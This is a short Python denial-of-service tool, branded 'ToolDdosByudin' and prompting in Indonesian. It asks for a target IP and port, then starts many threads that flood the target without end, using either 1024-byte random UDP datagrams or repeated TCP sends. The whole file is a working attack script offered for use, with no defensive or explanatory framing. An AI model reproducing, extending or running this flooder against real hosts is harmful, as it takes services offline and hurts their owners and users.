#!/usr/bin/env python3
import random
import socket
import threading
import os
import sys

os.system("clear")
print(" ToolDdosByudin ")
print("  ██╗░░██╗██╗░░░░░██████╗░██████╗░ ")
print("  ╚██╗██╔╝██║░░░░░██╔══██╗██╔══██╗ ")
print("  ░╚███╔╝░██║░░░░░██████╦╝██║░░██║ ")
print("  ░██╔██╗░██║░░░░░██╔══██╗██║░░██║ ")
print("  ██╔╝╚██╗███████╗██████╦╝██████╔╝ ")
print("  ╚═╝░░╚═╝╚══════╝╚═════╝░╚═════╝░ ")

ip = str(input(" IP TARGET:"))
port = int(input(" PORT:"))
choice = str(input(" GASKEN KIRIM PAKET?(y/n):"))
times = int(input(" PACKETS:"))
threads = int(input(" THREAD:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[PACKETS!!]","[PACKETS!!]","[PACKETS!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PERMISI PACKETS !!!")
		except:
			print("[!] BOOM!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[PAKET!!]","[PAKET!!]","[PAKET!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PERMISI PACKETS!!!")
		except:
			s.close()
			print("[*] BOOM")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
